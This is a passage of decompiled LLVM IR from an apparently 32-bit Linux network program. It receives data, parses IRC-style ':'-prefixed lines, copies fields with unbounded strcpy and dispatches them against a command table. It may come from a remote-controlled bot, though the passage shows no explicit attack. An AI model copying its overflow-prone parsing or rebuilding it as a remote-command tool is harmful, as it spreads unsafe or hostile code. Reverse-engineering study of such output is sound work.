  %v5_80552e2 = call i8* @_memset(i8* %tmp106, i32 0, i32 32)
  %v6_80552e2 = ptrtoint i8* %v5_80552e2 to i32
  %v0_80552ea = load i32, i32* @global_var_807cb70.29, align 16
  %v2_80552f1 = udiv i32 %v0_80552ea, 32
  store i32 %v2_80552f1, i32* %edx.global-to-local, align 4
  %v1_80552f9 = urem i32 %v0_80552ea, 32
  store i32 %v1_80552f9, i32* %eax.global-to-local, align 4
  %v0_80552fc = load i32, i32* @ebp, align 4
  %v2_80552fc = mul nuw nsw i32 %v2_80552f1, 4
  %v3_80552fc = add nsw i32 %v2_80552fc, -452
  %v4_80552fc = add i32 %v3_80552fc, %v0_80552fc
  %v5_80552fc = inttoptr i32 %v4_80552fc to i32*
  %v6_80552fc = load i32, i32* %v5_80552fc, align 4
  %v9_80552fc = shl i32 1, %v1_80552f9
  %v12_80552fc = or i32 %v6_80552fc, %v9_80552fc
  store i32 %v12_80552fc, i32* %v5_80552fc, align 4
  store i32 1200, i32* %stack_var_-332, align 4
  %v0_8055318 = load i32, i32* @global_var_807cb70.29, align 16
  %v1_805531d = add i32 %v0_8055318, 1
  store i32 %v1_805531d, i32* %edx.global-to-local, align 4
  %v0_8055320 = load i32, i32* @esp, align 4
  %v2_8055329 = add i32 %v0_8055320, -16
  %v3_8055329 = inttoptr i32 %v2_8055329 to i32*
  store i32 %v2_8055323, i32* %v3_8055329, align 4
  %v1_805532a = add i32 %v0_8055320, -20
  %v2_805532a = inttoptr i32 %v1_805532a to i32*
  store i32 0, i32* %v2_805532a, align 4
  %v1_805532c = add i32 %v0_8055320, -24
  %v2_805532c = inttoptr i32 %v1_805532c to i32*
  store i32 0, i32* %v2_805532c, align 4
  store i32 %v2_80552db, i32* %eax.global-to-local, align 4
  %v2_8055334 = add i32 %v0_8055320, -28
  %v3_8055334 = inttoptr i32 %v2_8055334 to i32*
  store i32 %v2_80552db, i32* %v3_8055334, align 4
  %v0_8055335 = load i32, i32* %edx.global-to-local, align 4
  %v2_8055335 = add i32 %v0_8055320, -32
  %v3_8055335 = inttoptr i32 %v2_8055335 to i32*
  store i32 %v0_8055335, i32* %v3_8055335, align 4
  %v0_8055336 = load i32, i32* %stack_var_-332, align 4
  %v5_8055336 = call i32 @__libc_select(i32 %v0_8055336, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8055336, i32* %eax.global-to-local, align 4
  %v0_805533b = load i32, i32* @esp, align 4
  %v1_805533b = add i32 %v0_805533b, 32
  %tmp108 = icmp slt i32 %v5_8055336, 1
  br i1 %tmp108, label %dec_label_pc_8055293, label %dec_label_pc_8055448.preheader

dec_label_pc_8055448.preheader:                   ; preds = %dec_label_pc_80552d1
  %v0_8055448141 = load i32, i32* @global_var_807407c.31, align 4
  store i32 %v0_8055448141, i32* %eax.global-to-local, align 4
  %v10_805544d143 = icmp eq i32 %v0_8055448141, 0
  br i1 %v10_805544d143, label %dec_label_pc_8055456, label %dec_label_pc_8055352

dec_label_pc_8055352:                             ; preds = %dec_label_pc_8055448.preheader, %dec_label_pc_8055445
  %storemerge9151 = phi i32 [ %.pre, %dec_label_pc_8055445 ], [ 0, %dec_label_pc_8055448.preheader ]
  %stack_var_-40.3150 = phi i32 [ %stack_var_-40.2, %dec_label_pc_8055445 ], [ %stack_var_-40.1, %dec_label_pc_8055448.preheader ]
  %v0_8055364149 = phi i32 [ %v0_805548046, %dec_label_pc_8055445 ], [ %v1_805533b, %dec_label_pc_8055448.preheader ]
  %v2_8055355 = mul i32 %storemerge9151, 4
  store i32 %v2_8055355, i32* %edx.global-to-local, align 4
  %v0_805535a = load i32, i32* @global_var_807e0fc.32, align 4
  %v2_805535f = add i32 %v0_805535a, %v2_8055355
  store i32 %v2_805535f, i32* %eax.global-to-local, align 4
  %v1_8055362 = inttoptr i32 %v2_805535f to i32*
  %v2_8055362 = load i32, i32* %v1_8055362, align 4
  store i32 %v2_8055362, i32* %eax.global-to-local, align 4
  %v1_8055367 = add i32 %v0_8055364149, -8
  %v2_8055367 = inttoptr i32 %v1_8055367 to i32*
  store i32 1, i32* %v2_8055367, align 4
  %v1_8055369 = add i32 %v0_8055364149, -12
  %v2_8055369 = inttoptr i32 %v1_8055369 to i32*
  store i32 0, i32* %v2_8055369, align 4
  %v0_805536b = load i32, i32* %eax.global-to-local, align 4
  %v2_805536b = add i32 %v0_8055364149, -16
  %v3_805536b = inttoptr i32 %v2_805536b to i32*
  store i32 %v0_805536b, i32* %v3_805536b, align 4
  %v4_805536c = call i32 @waitpid(i32 %storemerge9151, i32 %v6_80552e2, i32 %v2_80552db, i32 %stack_var_-40.3150)
  store i32 %v4_805536c, i32* %eax.global-to-local, align 4
  %v0_8055371 = load i32, i32* @esp, align 4
  %tmp109 = icmp slt i32 %v4_805536c, 1
  %.pre = add i32 %storemerge9151, 1
  br i1 %tmp109, label %dec_label_pc_8055445, label %dec_label_pc_805537c

dec_label_pc_805537c:                             ; preds = %dec_label_pc_8055352
  %v0_80553af126 = load i32, i32* @global_var_807407c.31, align 4
  %v10_80553b4127 = icmp ult i32 %.pre, %v0_80553af126
  %v2_8055388128 = mul i32 %.pre, 4
  store i32 %v2_8055388128, i32* %edx.global-to-local, align 4
  %v0_805538d129 = load i32, i32* @global_var_807e0fc.32, align 4
  %v2_8055392130 = add i32 %v0_805538d129, %v2_8055388128
  store i32 %v2_8055392130, i32* %eax.global-to-local, align 4
  %v1_8055395131 = add i32 %v2_8055392130, -4
  br i1 %v10_80553b4127, label %dec_label_pc_8055385, label %dec_label_pc_80553b9

dec_label_pc_8055385:                             ; preds = %dec_label_pc_805537c, %dec_label_pc_8055385
  %v1_8055395135 = phi i32 [ %v1_8055395, %dec_label_pc_8055385 ], [ %v1_8055395131, %dec_label_pc_805537c ]
  %v2_8055392134 = phi i32 [ %v2_8055392, %dec_label_pc_8055385 ], [ %v2_8055392130, %dec_label_pc_805537c ]
  %v2_8055388133 = phi i32 [ %v2_8055388, %dec_label_pc_8055385 ], [ %v2_8055388128, %dec_label_pc_805537c ]
  %storemerge11132 = phi i32 [ %v4_80553ac, %dec_label_pc_8055385 ], [ %.pre, %dec_label_pc_805537c ]
  store i32 %v1_8055395135, i32* @ecx, align 4
  store i32 %v2_8055388133, i32* %edx.global-to-local, align 4
  store i32 %v2_8055392134, i32* %eax.global-to-local, align 4
  %v1_80553a8 = inttoptr i32 %v2_8055392134 to i32*
  %v2_80553a8 = load i32, i32* %v1_80553a8, align 4
  %v2_80553aa = inttoptr i32 %v1_8055395135 to i32*
  store i32 %v2_80553a8, i32* %v2_80553aa, align 4
  %v4_80553ac = add i32 %storemerge11132, 1
  %v0_80553af = load i32, i32* @global_var_807407c.31, align 4
  %v10_80553b4 = icmp ult i32 %v4_80553ac, %v0_80553af
  %v2_8055388 = mul i32 %v4_80553ac, 4
  store i32 %v2_8055388, i32* %edx.global-to-local, align 4
  %v0_805538d = load i32, i32* @global_var_807e0fc.32, align 4
  %v2_8055392 = add i32 %v0_805538d, %v2_8055388
  store i32 %v2_8055392, i32* %eax.global-to-local, align 4
  %v1_8055395 = add i32 %v2_8055392, -4
  br i1 %v10_80553b4, label %dec_label_pc_8055385, label %dec_label_pc_80553b9

dec_label_pc_80553b9:                             ; preds = %dec_label_pc_8055385, %dec_label_pc_805537c
  %storemerge11.lcssa = phi i32 [ %.pre, %dec_label_pc_805537c ], [ %v4_80553ac, %dec_label_pc_8055385 ]
  %v1_8055395.lcssa = phi i32 [ %v1_8055395131, %dec_label_pc_805537c ], [ %v1_8055395, %dec_label_pc_8055385 ]
  %v1_80553cc = inttoptr i32 %v1_8055395.lcssa to i32*
  store i32 0, i32* %v1_80553cc, align 4
  %v0_80553d2 = load i32, i32* @global_var_807407c.31, align 4
  %v1_80553d7 = add i32 %v0_80553d2, -1
  store i32 %v1_80553d7, i32* @global_var_807407c.31, align 4
  %v2_80553e2 = mul i32 %v1_80553d7, 4
  %v1_80553e5 = add i32 %v2_80553e2, 4
  store i32 %v1_80553e5, i32* %eax.global-to-local, align 4
  %v0_80553e8 = load i32, i32* @esp, align 4
  %v2_80553eb = add i32 %v0_80553e8, -16
  %v3_80553eb = inttoptr i32 %v2_80553eb to i32*
  store i32 %v1_80553e5, i32* %v3_80553eb, align 4
  %v1_80553ec = call i32 @malloc(i32 %storemerge11.lcssa)
  %v0_80553f1 = load i32, i32* @esp, align 4
  %v1_80553f1 = add i32 %v0_80553f1, 16
  %v0_8055422137 = load i32, i32* @global_var_807407c.31, align 4
  store i32 %v0_8055422137, i32* %eax.global-to-local, align 4
  %v10_8055427138 = icmp eq i32 %v0_8055422137, 0
  br i1 %v10_8055427138, label %dec_label_pc_805542c, label %dec_label_pc_8055400

dec_label_pc_8055400:                             ; preds = %dec_label_pc_80553b9, %dec_label_pc_8055400
  %storemerge10139 = phi i32 [ %v4_805541f, %dec_label_pc_8055400 ], [ 0, %dec_label_pc_80553b9 ]
  %v2_8055403 = mul i32 %storemerge10139, 4
  %v5_8055408 = add i32 %v2_8055403, %v1_80553ec
  store i32 %v5_8055408, i32* @ecx, align 4
  store i32 %v2_8055403, i32* %edx.global-to-local, align 4
  %v0_8055413 = load i32, i32* @global_var_807e0fc.32, align 4
  %v2_8055418 = add i32 %v0_8055413, %v2_8055403
  store i32 %v2_8055418, i32* %eax.global-to-local, align 4
  %v1_805541b = inttoptr i32 %v2_8055418 to i32*
  %v2_805541b = load i32, i32* %v1_805541b, align 4
  %v2_805541d = inttoptr i32 %v5_8055408 to i32*
  store i32 %v2_805541b, i32* %v2_805541d, align 4
  %v4_805541f = add i32 %storemerge10139, 1
  %v0_8055422 = load i32, i32* @global_var_807407c.31, align 4
  store i32 %v0_8055422, i32* %eax.global-to-local, align 4
  %v10_8055427 = icmp ult i32 %v4_805541f, %v0_8055422
  br i1 %v10_8055427, label %dec_label_pc_8055400, label %dec_label_pc_8055422.dec_label_pc_805542c_crit_edge

dec_label_pc_8055422.dec_label_pc_805542c_crit_edge: ; preds = %dec_label_pc_8055400
  %v0_8055431.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805542c

dec_label_pc_805542c:                             ; preds = %dec_label_pc_80553b9, %dec_label_pc_8055422.dec_label_pc_805542c_crit_edge
  %v0_8055431 = phi i32 [ %v0_8055431.pre, %dec_label_pc_8055422.dec_label_pc_805542c_crit_edge ], [ %v1_80553f1, %dec_label_pc_80553b9 ]
  %storemerge10.lcssa = phi i32 [ %v4_805541f, %dec_label_pc_8055422.dec_label_pc_805542c_crit_edge ], [ 0, %dec_label_pc_80553b9 ]
  %v0_805542c = load i32, i32* @global_var_807e0fc.32, align 4
  store i32 %v0_805542c, i32* %eax.global-to-local, align 4
  %v2_8055434 = add i32 %v0_8055431, -16
  %v3_8055434 = inttoptr i32 %v2_8055434 to i32*
  store i32 %v0_805542c, i32* %v3_8055434, align 4
  %v1_8055435 = call i32 @free(i32 %storemerge10.lcssa)
  %v0_805543a = load i32, i32* @esp, align 4
  store i32 %v1_80553ec, i32* %eax.global-to-local, align 4
  store i32 %v1_80553ec, i32* @global_var_807e0fc.32, align 4
  br label %dec_label_pc_8055445

dec_label_pc_8055445:                             ; preds = %dec_label_pc_8055352, %dec_label_pc_805542c
  %v0_805548046.in = phi i32 [ %v0_805543a, %dec_label_pc_805542c ], [ %v0_8055371, %dec_label_pc_8055352 ]
  %stack_var_-40.2 = phi i32 [ %v1_80553ec, %dec_label_pc_805542c ], [ %stack_var_-40.3150, %dec_label_pc_8055352 ]
  %v0_805548046 = add i32 %v0_805548046.in, 16
  %v0_8055448 = load i32, i32* @global_var_807407c.31, align 4
  store i32 %v0_8055448, i32* %eax.global-to-local, align 4
  %v10_805544d = icmp ult i32 %.pre, %v0_8055448
  br i1 %v10_805544d, label %dec_label_pc_8055352, label %dec_label_pc_8055456

dec_label_pc_8055456:                             ; preds = %dec_label_pc_8055448.preheader, %dec_label_pc_8055445
  %v0_8055364.lcssa = phi i32 [ %v1_805533b, %dec_label_pc_8055448.preheader ], [ %v0_805548046, %dec_label_pc_8055445 ]
  %stack_var_-40.3.lcssa = phi i32 [ %stack_var_-40.1, %dec_label_pc_8055448.preheader ], [ %stack_var_-40.2, %dec_label_pc_8055445 ]
  %storemerge9.lcssa = phi i32 [ 0, %dec_label_pc_8055448.preheader ], [ %.pre, %dec_label_pc_8055445 ]
  %v0_8055456 = load i32, i32* @global_var_807cb70.29, align 16
  %v1_805545d = urem i32 %v0_8055456, 32
  store i32 %v1_805545d, i32* %edx.global-to-local, align 4
  %v2_8055465 = udiv i32 %v0_8055456, 32
  store i32 %v2_8055465, i32* %eax.global-to-local, align 4
  %v0_8055468 = load i32, i32* @ebp, align 4
  %v2_8055468 = mul nuw nsw i32 %v2_8055465, 4
  %v3_8055468 = add nsw i32 %v2_8055468, -452
  %v4_8055468 = add i32 %v3_8055468, %v0_8055468
  %v5_8055468 = inttoptr i32 %v4_8055468 to i32*
  %v6_8055468 = load i32, i32* %v5_8055468, align 4
  %v9_8055468 = shl i32 1, %v1_805545d
  %v10_8055468 = and i32 %v6_8055468, %v9_8055468
  %v11_8055468 = icmp ne i32 %v10_8055468, 0
  %v1_8055470 = zext i1 %v11_8055468 to i32
  %v3_8055470 = and i32 %v2_8055465, 134217472
  %v4_8055470 = or i32 %v1_8055470, %v3_8055470
  store i32 %v4_8055470, i32* %eax.global-to-local, align 4
  %v4_8055473 = icmp eq i1 %v11_8055468, false
  br i1 %v4_8055473, label %dec_label_pc_80552d1, label %dec_label_pc_805547b

dec_label_pc_805547b:                             ; preds = %dec_label_pc_8055456
  store i32 %v0_8055456, i32* %eax.global-to-local, align 4
  %v1_8055480 = add i32 %v0_8055364.lcssa, -4
  %v2_8055480 = inttoptr i32 %v1_8055480 to i32*
  store i32 0, i32* %v2_8055480, align 4
  %v1_8055482 = add i32 %v0_8055364.lcssa, -8
  %v2_8055482 = inttoptr i32 %v1_8055482 to i32*
  store i32 4096, i32* %v2_8055482, align 4
  store i32 %v2_8055487, i32* %edx.global-to-local, align 4
  %v2_805548d = add i32 %v0_8055364.lcssa, -12
  %v3_805548d = inttoptr i32 %v2_805548d to i32*
  store i32 %v2_8055487, i32* %v3_805548d, align 4
  %v0_805548e = load i32, i32* %eax.global-to-local, align 4
  %v2_805548e = add i32 %v0_8055364.lcssa, -16
  %v3_805548e = inttoptr i32 %v2_805548e to i32*
  store i32 %v0_805548e, i32* %v3_805548e, align 4
  %v4_805548f = call i32 @recv(i32 %storemerge9.lcssa, i32 %v6_80552e2, i32 %v2_80552db, i32 %stack_var_-40.3.lcssa)
  store i32 %v4_805548f, i32* %eax.global-to-local, align 4
  %tmp110 = icmp slt i32 %v4_805548f, 1
  br i1 %tmp110, label %dec_label_pc_8055293, label %dec_label_pc_80554a4

dec_label_pc_80554a4:                             ; preds = %dec_label_pc_805547b
  %v0_80554a7 = load i32, i32* @ebp, align 4
  %v2_80554a7 = add i32 %v4_805548f, -6596
  %v3_80554a7 = add i32 %v2_80554a7, %v0_80554a7
  %v4_80554a7 = inttoptr i32 %v3_80554a7 to i8*
  store i8 0, i8* %v4_80554a7, align 1
  %v0_80554af = load i32, i32* @esp, align 4
  %v1_80554b2 = add i32 %v0_80554af, -12
  %v2_80554b2 = inttoptr i32 %v1_80554b2 to i32*
  store i32 ptrtoint (i32* @global_var_806c83c.645 to i32), i32* %v2_80554b2, align 4
  store i32 %v2_8055487, i32* @eax, align 4
  %v2_80554bd = add i32 %v0_80554af, -16
  %v3_80554bd = inttoptr i32 %v2_80554bd to i32*
  store i32 %v2_8055487, i32* %v3_80554bd, align 4
  %v2_80554be = call i32 @__GI_strtok(i32 %v4_805548f, i32 %v2_80550a6)
  store i32 %v2_80554be, i32* %eax.global-to-local, align 4
  %v0_80554c3 = load i32, i32* @esp, align 4
  %v5_80554c6 = inttoptr i32 %v2_80554be to i8*
  store i8* %v5_80554c6, i8** %stack_var_-32, align 4
  %v5_805569824 = icmp eq i32 %v2_80554be, 0
  br i1 %v5_805569824, label %dec_label_pc_80552d1.outer, label %dec_label_pc_80556a2

dec_label_pc_80554ce:                             ; preds = %dec_label_pc_80556a2
  %v6_80554ce = add i32 %v5_80554ce.in, 12
  %v7_80554ce = inttoptr i32 %v6_80554ce to i32*
  store i32 %v4_80556a2, i32* %v7_80554ce, align 4
  %v0_80554d1 = call i32 @filter()
  %v3_80554d9 = load i8*, i8** %stack_var_-32, align 4
  %v4_80554d9 = ptrtoint i8* %v3_80554d9 to i32
  store i32 %v4_80554d9, i32* %eax.global-to-local, align 4
  %v2_80554dc = load i8, i8* %v3_80554d9, align 1
  %v3_80554dc = zext i8 %v2_80554dc to i32
  %v5_80554dc = and i32 %v4_80554d9, -256
  %v6_80554dc = or i32 %v3_80554dc, %v5_80554dc
  store i32 %v6_80554dc, i32* %eax.global-to-local, align 4
  %v10_80554de = icmp eq i8 %v2_80554dc, 58
  %v1_80554e0 = icmp eq i1 %v10_80554de, false
  br i1 %v1_80554e0, label %dec_label_pc_8055557, label %dec_label_pc_80554ee

dec_label_pc_80554eb:                             ; preds = %dec_label_pc_8055513
  %v4_80554eb = add i32 %storemerge8, 1
  br label %dec_label_pc_80554ee

dec_label_pc_80554ee:                             ; preds = %dec_label_pc_80554ce, %dec_label_pc_80554eb
  %storemerge8 = phi i32 [ %v4_80554eb, %dec_label_pc_80554eb ], [ 0, %dec_label_pc_80554ce ]
  store i32 %storemerge8, i32* %edx.global-to-local, align 4
  store i32 %v5_80554dc, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v3_8055508 = call i32 @_strlen(i8* %v3_80554d9)
  store i32 %v3_8055508, i32* %eax.global-to-local, align 4
  %v0_805550f = load i32, i32* %edx.global-to-local, align 4
  %v7_805550f = icmp ult i32 %v0_805550f, %v3_8055508
  %v1_8055511 = icmp eq i1 %v7_805550f, false
  %.pre67 = add i32 %storemerge8, %v4_80554d9
  br i1 %v1_8055511, label %dec_label_pc_80554ee.dec_label_pc_805551f_crit_edge, label %dec_label_pc_8055513

dec_label_pc_80554ee.dec_label_pc_805551f_crit_edge: ; preds = %dec_label_pc_80554ee
  %.pre74 = inttoptr i32 %.pre67 to i8*
  br label %dec_label_pc_805551f

dec_label_pc_8055513:                             ; preds = %dec_label_pc_80554ee
  store i32 %.pre67, i32* %eax.global-to-local, align 4
  %v1_8055519 = inttoptr i32 %.pre67 to i8*
  %v2_8055519 = load i8, i8* %v1_8055519, align 1
  %v3_8055519 = zext i8 %v2_8055519 to i32
  %v5_8055519 = and i32 %.pre67, -256
  %v6_8055519 = or i32 %v3_8055519, %v5_8055519
  store i32 %v6_8055519, i32* %eax.global-to-local, align 4
  %v7_805551b = icmp eq i8 %v2_8055519, 32
  %v1_805551d = icmp eq i1 %v7_805551b, false
  br i1 %v1_805551d, label %dec_label_pc_80554eb, label %dec_label_pc_805551f

dec_label_pc_805551f:                             ; preds = %dec_label_pc_8055513, %dec_label_pc_80554ee.dec_label_pc_805551f_crit_edge
  %v1_8055525.pre-phi = phi i8* [ %.pre74, %dec_label_pc_80554ee.dec_label_pc_805551f_crit_edge ], [ %v1_8055519, %dec_label_pc_8055513 ]
  store i8 0, i8* %v1_8055525.pre-phi, align 1
  %v3_8055528 = load i8*, i8** %stack_var_-32, align 4
  %v4_8055528 = ptrtoint i8* %v3_8055528 to i32
  %v1_805552b = add i32 %v4_8055528, 1
  %v0_805552c = load i32, i32* @esp, align 4
  %v2_805552f = add i32 %v0_805552c, -12
  %v3_805552f = inttoptr i32 %v2_805552f to i32*
  store i32 %v1_805552b, i32* %v3_805552f, align 4
  store i32 %v2_8055557, i32* @eax, align 4
  %v2_8055536 = add i32 %v0_805552c, -16
  %v3_8055536 = inttoptr i32 %v2_8055536 to i32*
  store i32 %v2_8055557, i32* %v3_8055536, align 4
  %v4_8055537 = call i32 @strcpy(i8* %v3_80554d9, i32 %stack_var_-6628.0.lcssa)
  %v0_805553c = load i32, i32* @esp, align 4
  %v4_8055542 = load i8*, i8** %stack_var_-32, align 4
  %v5_8055542 = ptrtoint i8* %v4_8055542 to i32
  %v6_8055542 = add i32 %storemerge8, 1
  %v1_8055545 = add i32 %v6_8055542, %v5_8055542
  store i32 %v1_8055545, i32* @eax, align 4
  %v2_8055549 = add i32 %v0_805553c, 4
  %v3_8055549 = inttoptr i32 %v2_8055549 to i32*
  store i32 %v1_8055545, i32* %v3_8055549, align 4
  %v3_805554a = load i8*, i8** %stack_var_-32, align 4
  %v4_805554a = ptrtoint i8* %v3_805554a to i32
  %v7_805554a = inttoptr i32 %v0_805553c to i32*
  store i32 %v4_805554a, i32* %v7_805554a, align 4
  %v4_805554d = call i32 @strcpy(i8* %v3_80554d9, i32 %stack_var_-6628.0.lcssa)
  store i32 %v4_805554d, i32* %eax.global-to-local, align 4
  %v3_8055571.pre.pre = load i8*, i8** %stack_var_-32, align 4
  br label %dec_label_pc_805556e.preheader

dec_label_pc_8055557:                             ; preds = %dec_label_pc_80554ce
  store i32 %v2_8055557, i32* %eax.global-to-local, align 4
  store i32 42, i32* %stack_var_-2508, align 4
  br label %dec_label_pc_805556e.preheader

dec_label_pc_805556e.preheader:                   ; preds = %dec_label_pc_805551f, %dec_label_pc_8055557
  %v3_8055571.pre = phi i8* [ %v3_8055571.pre.pre, %dec_label_pc_805551f ], [ %v3_80554d9, %dec_label_pc_8055557 ]
  %stack_var_-6632.2.ph = phi i8* [ %v3_80554d9, %dec_label_pc_805551f ], [ %stack_var_-6632.331, %dec_label_pc_8055557 ]
  %v4_8055571 = ptrtoint i8* %v3_8055571.pre to i32
  %v1_805557f = and i32 %v4_8055571, -256
  br label %dec_label_pc_805556e

dec_label_pc_805556b:                             ; preds = %dec_label_pc_8055593
  %v4_805556b = add i32 %storemerge7, 1
  br label %dec_label_pc_805556e

dec_label_pc_805556e:                             ; preds = %dec_label_pc_805556e.preheader, %dec_label_pc_805556b
  %storemerge7 = phi i32 [ %v4_805556b, %dec_label_pc_805556b ], [ 0, %dec_label_pc_805556e.preheader ]
  store i32 %storemerge7, i32* %edx.global-to-local, align 4
  store i32 %v1_805557f, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_8055571, i32* @edi, align 4
  %v3_8055588 = call i32 @_strlen(i8* %v3_8055571.pre)
  store i32 %v3_8055588, i32* %eax.global-to-local, align 4
  %v0_805558f = load i32, i32* %edx.global-to-local, align 4
  %v7_805558f = icmp ult i32 %v0_805558f, %v3_8055588
  %v1_8055591 = icmp eq i1 %v7_805558f, false
  %.pre59 = add i32 %storemerge7, %v4_8055571
  br i1 %v1_8055591, label %dec_label_pc_805556e.dec_label_pc_805559f_crit_edge, label %dec_label_pc_8055593

dec_label_pc_805556e.dec_label_pc_805559f_crit_edge: ; preds = %dec_label_pc_805556e
  %.pre66 = inttoptr i32 %.pre59 to i8*
  br label %dec_label_pc_805559f

dec_label_pc_8055593:                             ; preds = %dec_label_pc_805556e
  store i32 %.pre59, i32* %eax.global-to-local, align 4
  %v1_8055599 = inttoptr i32 %.pre59 to i8*
  %v2_8055599 = load i8, i8* %v1_8055599, align 1
  %v3_8055599 = zext i8 %v2_8055599 to i32
  %v5_8055599 = and i32 %.pre59, -256
  %v6_8055599 = or i32 %v3_8055599, %v5_8055599
  store i32 %v6_8055599, i32* %eax.global-to-local, align 4
  %v7_805559b = icmp eq i8 %v2_8055599, 32
  %v1_805559d = icmp eq i1 %v7_805559b, false
  br i1 %v1_805559d, label %dec_label_pc_805556b, label %dec_label_pc_805559f

dec_label_pc_805559f:                             ; preds = %dec_label_pc_8055593, %dec_label_pc_805556e.dec_label_pc_805559f_crit_edge
  %v1_80555a5.pre-phi = phi i8* [ %.pre66, %dec_label_pc_805556e.dec_label_pc_805559f_crit_edge ], [ %v1_8055599, %dec_label_pc_8055593 ]
  store i8 0, i8* %v1_80555a5.pre-phi, align 1
  %v0_80555a8 = load i32, i32* @esp, align 4
  %v3_80555ab = load i8*, i8** %stack_var_-32, align 4
  %v4_80555ab = ptrtoint i8* %v3_80555ab to i32
  %v6_80555ab = add i32 %v0_80555a8, -12
  %v7_80555ab = inttoptr i32 %v6_80555ab to i32*
  store i32 %v4_80555ab, i32* %v7_80555ab, align 4
  store i32 %v2_80555ae, i32* @eax, align 4
  %v2_80555b4 = add i32 %v0_80555a8, -16
  %v3_80555b4 = inttoptr i32 %v2_80555b4 to i32*
  store i32 %v2_80555ae, i32* %v3_80555b4, align 4
  %v3_80555b5 = ptrtoint i8* %stack_var_-6632.2.ph to i32
  %v5_80555b5 = call i32 @strcpy(i8* %v3_8055571.pre, i32 %v3_80555b5)
  %v0_80555ba = load i32, i32* @esp, align 4
  %v4_80555c0 = load i8*, i8** %stack_var_-32, align 4
  %v5_80555c0 = ptrtoint i8* %v4_80555c0 to i32
  %v6_80555c0 = add i32 %storemerge7, 1
  %v1_80555c3 = add i32 %v6_80555c0, %v5_80555c0
  store i32 %v1_80555c3, i32* @eax, align 4
  %v2_80555c7 = add i32 %v0_80555ba, 4
  %v3_80555c7 = inttoptr i32 %v2_80555c7 to i32*
  store i32 %v1_80555c3, i32* %v3_80555c7, align 4
  %v3_80555c8 = load i8*, i8** %stack_var_-32, align 4
  %v4_80555c8 = ptrtoint i8* %v3_80555c8 to i32
  %v7_80555c8 = inttoptr i32 %v0_80555ba to i32*
  store i32 %v4_80555c8, i32* %v7_80555c8, align 4
  %v5_80555cb = call i32 @strcpy(i8* %v3_8055571.pre, i32 %v3_80555b5)
  %v0_80555d0 = load i32, i32* @esp, align 4
  %v1_80555d0 = add i32 %v0_80555d0, 16
  %v4_8055626155 = load i32, i32* bitcast ([4 x i8]** @global_var_806f860.647 to i32*), align 8
  store i32 %v4_8055626155, i32* %eax.global-to-local, align 4
  %v1_805562d156 = icmp eq i32 %v4_8055626155, 0
  %v1_805562f157 = icmp eq i1 %v1_805562d156, false
  br i1 %v1_805562f157, label %dec_label_pc_80555dc, label %dec_label_pc_8055631

dec_label_pc_80555dc:                             ; preds = %dec_label_pc_805559f, %dec_label_pc_80555dc
  %v3_8055626161 = phi i32* [ %v3_8055626, %dec_label_pc_80555dc ], [ bitcast ([4 x i8]** @global_var_806f860.647 to i32*), %dec_label_pc_805559f ]
  %v1_8055626160 = phi i32 [ %v1_8055626, %dec_label_pc_80555dc ], [ 0, %dec_label_pc_805559f ]
  %storemerge159 = phi i32 [ %v4_8055620, %dec_label_pc_80555dc ], [ 0, %dec_label_pc_805559f ]
  %v0_80555e6158 = phi i32 [ %v1_805561d, %dec_label_pc_80555dc ], [ %v1_80555d0, %dec_label_pc_805559f ]
  store i32 %storemerge159, i32* %eax.global-to-local, align 4
  %v4_80555df = load i32, i32* %v3_8055626161, align 8
  store i32 %v4_80555df, i32* %edx.global-to-local, align 4
  store i32 %v2_80555ae, i32* %eax.global-to-local, align 4
  %v2_80555ef = add i32 %v0_80555e6158, -12
  %v3_80555ef = inttoptr i32 %v2_80555ef to i32*
  store i32 %v2_80555ae, i32* %v3_80555ef, align 4
  %v0_80555f0 = load i32, i32* %edx.global-to-local, align 4
  %v2_80555f0 = add i32 %v0_80555e6158, -16
  %v3_80555f0 = inttoptr i32 %v2_80555f0 to i32*
  store i32 %v0_80555f0, i32* %v3_80555f0, align 4
  %v2_80555f1 = inttoptr i32 %storemerge159 to i8*
  %v3_80555f1 = call i32 @__GI_strcasecmp(i8* %v2_80555f1, i32 %v2_80550a6)
  %v0_80555f6 = load i32, i32* @esp, align 4
  store i32 %storemerge159, i32* %eax.global-to-local, align 4
  %v2_8055600 = add i32 %v1_8055626160, ptrtoint (i32* @global_var_806f864.648 to i32)
  %v3_8055600 = inttoptr i32 %v2_8055600 to i32*
  %v4_8055600 = load i32, i32* %v3_8055600, align 4
  %v0_8055607 = load i32, i32* @global_var_807cb70.29, align 16
  store i32 %v0_8055607, i32* %edx.global-to-local, align 4
  %v3_8055610 = load i8*, i8** %stack_var_-32, align 4
  %v4_8055610 = ptrtoint i8* %v3_8055610 to i32
  %v6_8055610 = add i32 %v0_80555f6, 8
  %v7_8055610 = inttoptr i32 %v6_8055610 to i32*
  store i32 %v4_8055610, i32* %v7_8055610, align 4
  store i32 %v2_8055557, i32* %eax.global-to-local, align 4
  %v2_8055619 = add i32 %v0_80555f6, 4
  %v3_8055619 = inttoptr i32 %v2_8055619 to i32*
  store i32 %v2_8055557, i32* %v3_8055619, align 4
  %v0_805561a = load i32, i32* %edx.global-to-local, align 4
  %v3_805561a = inttoptr i32 %v0_80555f6 to i32*
  store i32 %v0_805561a, i32* %v3_805561a, align 4
  %v1_805561b = add i32 %v0_80555f6, -4
  %v2_805561b = inttoptr i32 %v1_805561b to i32*
  store i32 134567453, i32* %v2_805561b, align 4
  call void @__pseudo_call(i32 %v4_8055600)
  %v0_805561d = load i32, i32* @esp, align 4
  %v1_805561d = add i32 %v0_805561d, 16
  %v4_8055620 = add i32 %storemerge159, 1
  store i32 %v4_8055620, i32* %eax.global-to-local, align 4
  %v1_8055626 = mul i32 %v4_8055620, 8
  %v2_8055626 = add i32 %v1_8055626, ptrtoint ([4 x i8]** @global_var_806f860.647 to i32)
  %v3_8055626 = inttoptr i32 %v2_8055626 to i32*
  %v4_8055626 = load i32, i32* %v3_8055626, align 8
  store i32 %v4_8055626, i32* %eax.global-to-local, align 4
  %v1_805562d = icmp eq i32 %v4_8055626, 0
  %v1_805562f = icmp eq i1 %v1_805562d, false
  br i1 %v1_805562f, label %dec_label_pc_80555dc, label %dec_label_pc_8055631

dec_label_pc_8055631:                             ; preds = %dec_label_pc_80555dc, %dec_label_pc_805559f
